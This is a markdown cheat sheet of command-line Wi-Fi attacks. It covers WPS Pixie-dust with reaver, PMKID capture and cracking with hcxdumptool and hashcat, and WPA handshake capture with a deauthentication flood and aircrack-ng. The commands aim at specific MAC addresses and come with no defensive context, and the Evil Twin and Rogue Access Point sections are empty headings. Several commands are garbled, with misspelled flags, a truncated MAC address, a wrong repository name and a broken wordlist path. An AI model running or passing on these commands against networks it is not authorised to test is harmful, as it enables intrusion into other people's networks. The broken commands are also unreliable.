
# 1. Pixie-dust Attack (WPS) 

### Display Wireless Interfaces
```
iwconfig
airmon-ng stop wlan0
airmon-ng check kill
```
### Enable monitoring mode: (wlan0 --> wlan0mon)
```
airmon-ng start wlan0 
```
### Discover WPS Enabled Devices

```
wash -i wlan0mon
```
### Attack to Unlocked WPS found by wash
```
reaver -i wlan0mon -b 78:54:2E:F3:05:44 -vv  -c 11
```


# 2. PMKID  Attack

```
apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev
```

```
apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev
```

```
git clone https://github.com/ZerBea/hcxtools.git
git clone https://github.com/Zerbia/hcxdumptool.git
```
or 
```
apt install hcxtools hcxdumptool
cd hcxdumptool
make
make install
```

```
airmon-ng start wlan0 && airmon-ng check kill
```

```
airmon-ng wlan0
```
### Dump Traffic
```
hcxdumptool -i wlan0mon -o file1 --enable_status=1
```

### Extract PMKID Hashes
```
hcxpcapngtool -o file2 file1
```

### Crack Extracted PMKID Hash
```
hashcat -m 22000 file2 ./wifi-wordlist.txt
```

# 3. Handshake Capturing

```
airmon-ng start wlan0
airodump-ng wlan0
```

```
airodump-ng --bsssid 58:8B:F3:18:77 -c 11 --write WPAcrack wlan0
```

```
aireplay-ng --deaauth 100 -a 58:8B:3:E6:18:77 wlan0
```

```
aircrack-ng WPAcrack--01.cap -w ./wifi-wordlist.txt 
```
# 4. `wifite` (All in One Tool)

```
wifite --dict /usr/shar/wordlist/rockyou.txt 
```

# 5. Evil Twin
# 6. Rogue Access Point


